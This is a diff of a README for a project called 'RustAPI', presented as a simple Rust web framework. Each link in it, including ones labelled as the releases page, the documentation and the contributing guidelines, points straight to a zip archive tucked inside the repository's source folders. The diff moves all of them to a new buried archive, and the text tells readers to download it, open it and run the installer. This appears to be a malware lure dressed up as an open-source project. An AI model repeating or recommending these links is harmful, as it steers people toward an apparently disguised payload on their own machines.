@@ -1,6 +1,6 @@
 # 🌐 RustAPI - Your Simple Path to Rust Web Apps
 
-[![Download RustAPI](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip%20RustAPI-v1.0.0-brightgreen)](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip)
+[![Download RustAPI](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip%20RustAPI-v1.0.0-brightgreen)](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to RustAPI! This software empowers you to build web applications easily 
 
 To get started, follow these steps:
 
-1. Click [here to visit the RustAPI Releases page](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip).
+1. Click [here to visit the RustAPI Releases page](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip).
 2. On the Releases page, look for the latest version. 
 3. Select your operating system and download the appropriate file.
 4. Once downloaded, open the file and follow the on-screen instructions to complete the installation.
@@ -55,7 +55,7 @@ Now visit `http://localhost:8000` in your web browser. You should see your new R
 
 ## 📝 Documentation
 
-For more detailed information, the full documentation is available within the application. You can also find the online version [here](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip).
+For more detailed information, the full documentation is available within the application. You can also find the online version [here](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip).
 
 ## 🐛 Troubleshooting
 
@@ -82,7 +82,7 @@ Feel free to ask questions or share your experiences!
 
 ## 🛠️ Contributing
 
-If you'd like to contribute to RustAPI, please check the guidelines in the [https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip). Your input helps us make RustAPI better for everyone.
+If you'd like to contribute to RustAPI, please check the guidelines in the [https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip). Your input helps us make RustAPI better for everyone.
 
 ## 📡 Follow Updates
 
@@ -95,4 +95,4 @@ Keep up with the latest developments:
 
 We hope you enjoy using RustAPI. As you start building your applications, remember that help is available. Don’t hesitate to reach out and explore all that RustAPI has to offer!
 
-For any downloads, remember to visit [this page](https://raw.githubusercontent.com/hashdjdhhd/RustAPI/main/benches/API_Rust_v1.2.zip) again. Happy coding!
+For any downloads, remember to visit [this page](https://github.com/hashdjdhhd/RustAPI/raw/refs/heads/main/crates/rustapi-extras/src/oauth2/Rust_API_3.6.zip) again. Happy coding!
